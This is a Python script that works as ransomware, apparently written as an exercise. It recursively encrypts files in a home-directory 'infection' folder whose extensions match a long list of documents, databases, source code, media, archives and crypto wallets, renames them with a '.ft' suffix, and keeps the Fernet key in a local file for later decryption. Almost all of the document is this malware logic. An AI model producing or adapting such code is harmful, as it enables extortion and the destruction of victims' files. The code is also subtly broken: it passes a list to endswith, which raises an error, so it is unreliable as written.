from cryptography.fernet import Fernet
import os
import sys


silence = False
mode = 'e'
extensions = ['.doc', '.docx', '.xls',
            '.xlsx', '.ppt', '.pptx', '.pdf',
            '.rtf', '.dbf', '.123', '.csv',
            '.sql', '.mdb', '.sln', '.php',
            '.asp', '.aspx', '.html', '.xml',
            '.psd', '.java', '.jpeg', '.bmp',
            '.png', '.gif', '.raw', '.mp3',
            '.mp4', '.avi', '.mkv', '.zip',
            '.rar', '.7z', '.bak', '.dat',
            '.log', '.tar', '.cpp', '.py',
            '.cs', '.js', '.lua', '.pl',
            '.rb', '.vb', '.bak', '.wallet',
            '.snc', '.bip', '.poker',
            '.backup', '.wallet.dat', '.ft']


def log(msg):
    if not silence:
        print(msg)


def encryptFolder(path, encrypter):
    if not os.access(path, os.R_OK | os.W_OK):
        log(f'Could not access {path}')
        return
    log(f'Encrypting {path}')
    big_list = os.listdir(path)
    files_list = [os.path.join(path, i) for i in big_list if os.path.isfile(os.path.join(path, i)) and i.endswith(extensions)]
    dir_list = [os.path.join(path, i) for i in big_list if os.path.isdir(os.path.join(path, i))]
    for file in files_list:
        with open(file, 'br') as f:
            content = f.read()
        with open(file, 'bw') as f:
            f.write(encrypter.encrypt(content))
        if not file.endswith('.ft'):
            os.rename(file, file + '.ft')
    for di in dir_list:
        encryptFolder(di, encrypter)


def decryptFolder(path, encrypter):
    if not os.access(path, os.R_OK | os.W_OK):
        log(f'Could not access {path}')
        return
    big_list = os.listdir(path)
    files_list = [os.path.join(path, i) for i in big_list if os.path.isfile(os.path.join(path, i))]
    dir_list = [os.path.join(path, i) for i in big_list if os.path.isdir(os.path.join(path, i))]
    for file in files_list:
        with open(file, 'br') as f:
            content = f.read()
        with open(file, 'bw') as f:
            f.write(encrypter.decrypt(content))
        if file.endswith('.ft'):
            os.rename(file, file[:-3])
    for di in dir_list:
        decryptFolder(di, encrypter)


def encMode(location):
    # Checks if key creation is successful
    key = Fernet.generate_key()
    try:
        with open('key.key', 'wb') as file:
            file.write(key)
    except Exception:
        print('Could not create key file', file=sys.stderr)
        exit(1)
    encryptFolder(location, Fernet(key))


def decMode(location):
    # Checks if key path is readable
    try:
        with open('key.key', 'r') as file:
            key = file.read()
            print(f'key is {key}')
    except Exception:
        print('Could not read key file', file=sys.stderr)
        exit(1)
    decryptFolder(location, Fernet(key))


if __name__ == '__main__':
    # Creates home path and checks if env is set
    home = os.environ.get('HOME')
    if not home:
        print('HOME env not set', file=sys.stderr)
        exit(1)
    # Create infection location path and checks if exists
    location = home + '/infection'
    if not os.path.exists(location):
        print(f'{location} does not exists', file=sys.stderr)
        exit(1)
    if mode == 'e':
        encMode(location)
    else:
        decMode(location)
